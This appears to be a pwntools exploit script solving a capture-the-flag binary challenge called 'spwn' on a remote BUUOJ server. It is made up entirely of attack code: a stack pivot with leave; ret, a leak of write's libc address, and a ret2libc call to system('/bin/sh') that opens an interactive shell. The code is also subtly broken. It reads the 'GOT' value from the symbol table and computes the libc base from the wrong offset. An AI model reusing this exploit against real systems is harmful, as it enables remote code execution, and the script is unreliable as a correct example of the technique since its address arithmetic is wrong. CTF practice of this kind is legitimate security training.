from pwn import *
context(log_level='debug')
#io = process("./spwn")
io = remote("node3.buuoj.cn",29713)
elf = ELF("./spwn")
libc = ELF("./libc-2.23.so")
write_plt = elf.sym['write']
write_got = elf.sym['write']
main = elf.sym['main']
leave_ret = 0x08048408
s_addr = 0x0804A300
io.recvuntil("name?")
payload = p32(write_plt) + p32(main) + p32(1)+p32(write_got)+ p32(4)
io.sendline(payload)
io.recvuntil("say?")
payload1 = 0x18*'a'+p32(s_addr-4) + p32(leave_ret)
io.sendline(payload1)
write_addr = u32(io.recv(4))
base = write_addr - write_got
sys_addr = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = p32(sys_addr) + p32(main) + p32(bin_sh)
io.sendline(payload)
io.recvuntil("say?")
io.sendline(payload1)
io.interactive()